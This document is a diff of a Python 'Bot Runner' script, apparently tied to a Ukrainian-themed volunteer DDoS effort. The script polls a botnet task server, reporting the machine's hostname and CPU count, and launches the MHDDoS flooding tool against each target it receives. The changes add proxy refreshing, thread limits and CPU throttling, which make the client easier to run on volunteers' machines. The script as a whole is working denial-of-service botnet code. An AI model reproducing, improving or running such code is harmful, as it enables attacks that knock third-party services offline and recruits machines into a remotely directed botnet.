@@ -1,20 +1,28 @@
 #!/usr/bin/env python3
 
 import json
+import psutil
 import subprocess
 import sys
-import psutil
 
+from collections import namedtuple
+from logging import basicConfig, getLogger
+from pathlib import Path
+from queue import Queue
 from socket import gethostname
+from sys import argv
+from threading import Thread
 from time import sleep
 from urllib.request import urlopen
-from threading import Thread
-from collections import namedtuple
-from pathlib import Path
-from logging import basicConfig, getLogger
-from queue import Queue
 
 import MHDDoS.start as MHDDoS
+
+from proxies import update_file
+
+import ctypes
+libgcc_s = ctypes.CDLL('libgcc_s.so.1')
+
+getLogger('proxies').setLevel("CRITICAL")
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -22,10 +30,9 @@ basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
 logger = getLogger("Bot Runner")
 logger.setLevel("INFO")
 
-url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()};cpu_count={psutil.cpu_count()};"
-logger.info(f"The task {url=}")
+url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
 
-loop_time = 120
+loop_time = 60
 RETRY_PERIOD_SEC = 30
 
 
@@ -87,7 +94,7 @@ def runner(config):
                 str(config.Proto),
                 str(config.Dst),
                 str(config.ProxyType),
-                str(config.Threads),
+                str(config.Threads if thread_limit <= 0 else thread_limit),
                 str(config.ProxyList),
                 str(config.RPC),
                 str(period)
@@ -96,7 +103,7 @@ def runner(config):
             params = [
                 str(config.Proto),
                 str(config.Dst),
-                str(config.Threads),
+                str(config.Threads if thread_limit <= 0 else thread_limit),
                 str(period),
                 str(config.ProxyType),
                 str(config.ProxyList)
@@ -106,57 +113,70 @@ def runner(config):
             params = [
                 str(config.Proto),
                 str(config.Dst),
-                str(config.Threads),
+                str(config.Threads if thread_limit <= 0 else thread_limit),
                 str(period)
             ]
         else:
             logger.info(
                 'No we cant run the LEVEL7 attacks without proxy. Skipping')
     try:
+        cpu_usage = psutil.cpu_percent(4)
+        while cpu_usage > cpu_limit:
+            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
+            sleep(loop_time)
+            cpu_usage = psutil.cpu_percent(4)
         subprocess.run([sys.executable, "MHDDoS/start.py", *params])
+        logger.info("The system works good! Thanks :P ")
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
-        logger.info(f"OOPS... {config.Dst} -> Some issue: {error=}")
+        logger.info(f"OOPS... {config.Dst} -> Issue: {error}")
 
 
 if __name__ == '__main__':
 
+    pool_size = int(argv[1]) if len(argv) >= 2 else int(psutil.cpu_count() / 2)
+    thread_limit = int(argv[2]) if len(argv) >= 3 else 0
+    cpu_limit = int(argv[3]) if len(argv) >= 4 else 70
+
+    logger.info('''
+  ____      _               ____                         _   _   _   _    
+ / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
+| |  | | | | '_ \ / _ \ '__\___ \| '_ \ / _` |/ __/ _ \ | | | | | |/ _ \  
+| |__| |_| | |_) |  __/ |   ___) | |_) | (_| | (_|  __/ | | | |_| / ___ \ 
+ \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
+      |___/                      |_|                    |_|               
+''')
+
+    logger.info(f"Task server {url}")
+
     try:
-        pool = ThreadPool(int(psutil.cpu_count() / 2) + 1)
+        pool = ThreadPool(pool_size)
 
-        MHDDoS.threads = 1000
-        proxy_config = json.load(open("MHDDoS/config.json"))
+        logger.info("Get fresh proxies. Please wait...")
+        update_file()
 
-        MHDDoS.handleProxyList(proxy_config, Path(
-            "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)
+        #MHDDoS.threads = 10
+        #proxy_config = json.load(open("MHDDoS/config.json"))
+        #MHDDoS.handleProxyList(proxy_config, Path(
+        #    "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)
 
         while True:
 
             logger.info("Getting fresh tasks from the server!")
             try:
-
                 for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
-                    while int(psutil.cpu_percent()) > 70:
-                        logger.info(
-                            "The CPU load is too high. Thread waiting...")
-                        logger.info(
-                            f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
-                        sleep(loop_time)
-
                     pool.add_task(runner, conf)
                     sleep(loop_time / 4)
-
                 pool.wait_completion()
 
             except Exception as error:
                 logger.critical(f"OOPS... We faced an issue: {error}")
-                logger.info("The system works good! Thanks :P ")
                 logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                 sleep(RETRY_PERIOD_SEC)
 
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
     except Exception as error:
-        logger.critical(f"OOPS... We faced an issue: {error=}")
+        logger.critical(f"OOPS... We faced an issue: {error}")
         logger.info("Please restart the tool! Thanks")
